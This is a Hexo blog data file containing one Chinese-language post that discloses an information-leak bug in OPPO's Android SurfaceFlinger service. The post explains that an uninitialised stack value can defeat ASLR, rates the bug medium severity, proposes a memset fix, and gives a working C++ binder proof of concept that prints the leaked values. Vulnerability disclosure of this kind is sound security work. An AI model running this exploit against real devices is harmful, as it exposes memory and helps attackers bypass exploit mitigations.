{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"OPPO Surfaceflinger服务漏洞","slug":"OPPO-SurfaceFlinger服务漏洞","date":"2020-04-13T09:43:38.000Z","updated":"2020-04-13T10:29:10.588Z","comments":true,"path":"2020/04/13/OPPO-SurfaceFlinger服务漏洞/","link":"","permalink":"http://yoursite.com/2020/04/13/OPPO-SurfaceFlinger%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"Surfaceflinger服务漏洞1：代码位置：frameworks/native/services/surfaceflinger/SurfaceFlinger.cpp 描述：rgb是定义在栈上但未初始化，因此当screenShot函数未能对rgb赋值时，会将未初始化值返回给攻击者，导致栈上的值信息泄露，该漏洞可被攻击者用于绕过ALSR。 定级：中危 修复建议：初始化rgb为0，如在‘RGB rgb’后添加一行代码‘memset(&amp;rgb, 0, sizeof(rgb))’。 poc： 1234567891011121314151617181920212223242526272829303132333435363738&#x2F;*fingerprint:[ro.vendor.oppo.fingerprint]: [OPPO&#x2F;PCLM00&#x2F;OP4A89:9&#x2F;PKQ1.190616.001&#x2F;1561776556:user&#x2F;release-keys]*&#x2F;#include &lt;binder&#x2F;IServiceManager.h&gt;#include &lt;binder&#x2F;IBinder.h&gt;#include &lt;binder&#x2F;Parcel.h&gt;#include &lt;utils&#x2F;String16.h&gt;using namespace android;&#x2F;*Info leak*&#x2F;static void screenShot()&#123; sp&lt;IServiceManager&gt; sm &#x3D; defaultServiceManager(); sp&lt;IBinder&gt; binder &#x3D; sm-&gt;getService(String16(&quot;SurfaceFlinger&quot;)); Parcel data, reply; data.writeInterfaceToken(String16(&quot;android.ui.ISurfaceComposer&quot;)); binder-&gt;transact(2018, data, &amp;reply); int r &#x3D; reply.readInt32(); int g &#x3D; reply.readInt32(); int b &#x3D; reply.readInt32(); printf(&quot;leak data: %x, %x, %x\\n&quot;, r, g, b); return;&#125;int main(void)&#123; screenShot(); return 0;&#125;","categories":[],"tags":[]}],"categories":[],"tags":[]}